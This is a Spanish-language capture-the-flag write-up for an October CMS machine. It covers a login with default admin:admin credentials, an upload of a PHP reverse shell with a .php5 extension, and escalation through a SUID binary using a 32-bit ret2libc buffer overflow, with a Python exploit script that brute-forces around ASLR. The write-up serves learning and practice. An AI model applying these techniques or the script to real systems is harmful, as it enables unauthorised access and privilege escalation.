-----------
- Tags: #buffer-overflow #cms #octuber #nx-enable #aslr-enable
-----------
## Tecnicas Utilizadas
- Abusing October CMS (Upload File Vulnerability)  
- Buffer Overflow - Bypassing ASLR + Ret2libc (x32 bits)  
-----------
## Procedimiento

![[Pasted image 20230607090345.png]]
Enumeramos la pagina y nos percatamos que estamos ante un CMS con nombre october

   ![[Pasted image 20230607090732.png]]
Revisando las vulnerabilidades disponibles para este CMS encontramos una que es para la subida de archivos multitudinaria maliciosos

![[Pasted image 20230607090938.png]]

El único inconveniente es que aun no sabemos como ni donde subir ese archivo multimedia. En el texto de la vulnerabilidad nos hablan de una ruta `http://octubercms/backend`. Esta es la ruta para gestionar todo el contenido que se muestra en la web, si entramos, vemos que nos piden credenciales. Una búsqueda por google nos indica que las credenciales por defecto son **admin:admin**.

![[Pasted image 20230607091204.png]]

Y vemos, que las credenciales están por defecto. Una vez dentro, nos dirigimos a la parte multimedia e intentamos cargar un php malicioso pero con la extensión .php5. El archivo se sube con éxito y no hace falta mas que ir al archivo para interpretar nuestra reverse shell.

Una vez en la maquina, con el  comando `find / -perm -4000 2>/dev/null` nos percatamos de un archivo con nombre *ovrflow*
que como su nombre lo indica, contempla un **Buffer OverFlow**.

#### buffer overflow

Antes que nada, hay ciertas cuestiones que tenemos que tener en cuenta; ¿La maquina es de *32 bits*?,  ¿La maquina cuenta con el *ASRL* activado?, ¿Que protecciones tiene el binario?. Una vez sabiendo esto, podemos proceder a lo siguiente.

Lo primero que tenemos que ver es cuanto *data* se necesita para alcanzar el $EIP, esto lo podemos lograr con un comando que nos brinda gdb(en nuestro caso gef):

Esto nos crea un patrón con mucha información para desbordar el buffer - > `pattern create`
Esto nos indica cuanta información se necesita antes de sobrescribir el $EIP -> `pattern offset $EIP`

Una vez sabiendo esto, podemos proceder con el **Ret2LibC**.
¿Que es lo que queremos lograr? Pues necesitamos que *$EIP* apunte a *System*, tambien a  *Exit* y por ultimo a la de */bin/sh*

**$EIP** -> *SYSTEM* + *EXIT* + */bin/sh*

Podemos sacar las direcciones de estas funciones con el propio *gef* haciendo un `p System | p Exit | search &system, /bin/sh`. El problema aquí es que el ASRL esta activado. así que lo que tenemos que hacer es coger una dirección base de libc y con esta computar unos offsets para llegar a las direciones reales de las funciones.
Empecemos con el script
```python

# Para evitar voltear la cadena, automatiza el Little Indian
from struct import pack
# Para poder ejecutar el comando con el metodo call
from subprocess import call

# La data a introduciar antes de sobreescribir el EIP
offset = 112
junk = b"A" * offset

# ret2libc -> system_addr -> exit_addr -> bin_sh_addr

# La podemos sacar haciendo ldd al binario
base_libc_addr = 0x0000000

#offsets
	#readelf -s /path/libc | grep -E " system| exit"
system_addr_off = 0x000000
exit_addr_off = 0x000000
	#strings -a -t x /path/libc | grep "/bin/sh"
bin_sh_addr_off = 0x000000

# La sumatoria para dar con la direccion "real" de las funciones
system_addr = pack("<L", base_libc_addr + system_addr_off)
exit_addr = pack("<L", base_libc_addr + exit_addr_off)
bin_sh_addr = pack("<L", base_libc_addr + bin_sh_addr_off)

payload = junk + system_addr + exit_addr + bin_sh_addr

while True:
	bof = call(["/binary/path", payload])

```







